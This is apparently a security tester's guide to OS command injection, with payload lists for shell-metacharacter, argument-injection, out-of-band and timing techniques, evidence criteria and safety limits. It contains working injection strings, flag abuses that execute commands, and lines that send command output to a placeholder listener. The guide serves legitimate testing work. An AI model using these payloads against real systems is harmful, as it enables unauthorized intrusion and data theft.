# OS command injection — families, payloads, oracle

User input reaches a shell, a CLI argument, or a filename that a tool parses. The
finding is a reflected/OOB/timing-proven **`id`/`whoami`**, not the reflected
payload string. Surfaces: network tools (ping/traceroute/dig/nslookup/whois/host),
"export/convert" that shells out (git/tar/zip/unzip/rsync/curl/wget/ffmpeg/convert/
pdftk), filename handling, SSRF-fetchers that pass the URL to `curl`, webhook
"test", DNS/WHOIS lookups, backup/restore.

## Family 1 — shell metacharacter injection

Input is concatenated into a shell string (`sh -c "ping $host"`,
`subprocess(..., shell=True)`, `system()`, backticks, `os.system`). Break out with a
separator, run a benign command:

```
; id           | id           & id           && id           || id
$(id)          `id`           %0a id          %0d%0a id       $(sleep 5)
127.0.0.1; id                 127.0.0.1 | id                  127.0.0.1 %26%26 id
$(id)@x                       ${IFS}id        {id,}           a"$(id)"b
```

- `%0a` (newline) is the highest-yield separator when the input is one token of a
  line-based command (ping host, DNS name).
- `$IFS` / `${IFS}` / `{cmd,arg}` / `$'\x20'` bypass space filters:
  `;cat${IFS}/etc/passwd`, `;{cat,/etc/passwd}`.
- Filtered keywords? split with quotes/concat: `i""d`, `i\d`, `/bin/i?d`, `w'h'oami`.

## Family 2 — argument / flag injection (no shell needed)

Input is passed as an **argv element** to a tool that treats a leading `-` as an
option. No metacharacters required — the value itself becomes a dangerous flag. This
is the family people miss.

- **git** — `--upload-pack=<cmd>` / `-u <cmd>` on `clone`/`fetch`/`ls-remote`:
  a repo URL or ref you control becomes `git clone --upload-pack='touch /tmp/x' ...`
  -> exec. `-c core.sshCommand=<cmd>`, `ext::sh -c <cmd>` transport.
- **tar** — `--checkpoint=1 --checkpoint-action=exec=<cmd>` when a filename starting
  with `-` reaches `tar`; also `--to-command=<cmd>`, `--use-compress-program=<cmd>`.
- **curl** — `-o /path` (write files), `-K <file>` (read a config file), `--upload-file`;
  a URL param that becomes `curl <userinput>` lets you inject `-o`/`-K`.
- **wget** — `--output-document`, `--use-askpass=<cmd>` (exec), `-O`.
- **ffmpeg** — protocol/demuxer abuse: `-i concat:...`, the `subfile:`/`file:` reads,
  an HLS/`.m3u8` playlist referencing `file:///etc/passwd` -> SSRF/LFI-in-output.
- **rsync** — `-e <cmd>`, `--rsh=<cmd>`.
- **find** — `-exec <cmd> ;`, `-fprintf`.
- **zip** — `-T -TT '<cmd>'` (unzip test command), `-A`.
- **ssh/scp** — `-o ProxyCommand=<cmd>`, `-o LocalCommand=... -o PermitLocalCommand=yes`.
- **PHP/ImageMagick/convert** — see `upload-converter-parser.md`.

Deliver via: a filename that starts with `-` (`--checkpoint-action=exec=id`), a URL
field, a hostname field, a ref/branch name, an "output path" field.

## Family 3 — blind / OOB (no reflected output)

When output isn't returned, exfil out-of-band:

```
; curl http://<oob>/$(whoami)                 ; wget -q -O- http://<oob>/`id`
; nslookup `whoami`.<oob>                      ; dig $(hostname).<oob>
; ping -c1 $(whoami|tr -d '\n').<oob>          `curl${IFS}<oob>/$(id|base64)`
```

- DNS exfil (`nslookup`/`dig`/`ping`) works even when egress HTTP is blocked.
- Encode output that contains spaces/newlines: `$(id | base64)` into the subdomain
  or path, decode on your listener.

## Family 4 — timing (no output, no egress)

When neither reflection nor OOB is possible, prove execution with a measurable
delay and a clean baseline:

```
; sleep 10                 & timeout 10          $(sleep 10)      `sleep 10`
127.0.0.1 -c 20            # ping count = time delay
;ping -c 10 127.0.0.1      &&sleep 10
```

Baseline the request without the payload; a repeatable +10s only when the payload is
present is the proof. Vary the sleep (5/10/15s) to rule out coincidence.

## Oracle / evidence

- **Confirm:** `id`/`whoami`/`hostname`/`uname` output reflected in the response or
  a downstream artifact; OOB listener hit whose subdomain/path carries the command
  output; repeatable timing differential matching the injected sleep.
- **Negative control:** the same field with a benign value returns normally / no
  delay / no OOB hit; a quoted-safe sibling parameter doesn't fire.
- **Not a finding:** the value is passed as a single argv element to a tool with no
  flag-injection path AND no shell (properly parameterised); reflected string with
  no execution; timing variance with no clean baseline.

## Proof + safety

- Fire **one** benign, non-mutating command (`id`/`whoami`/`hostname`/`uname -a`,
  read `/etc/passwd`). That is rung 1 — the finding.
- No reverse shells, no persistence, no destructive commands, no writing real files.
- OOB uses your own listener; encode output, don't exfil host data beyond the proof.
- Capture uid/host/container context; state blast radius by inference; then stop.
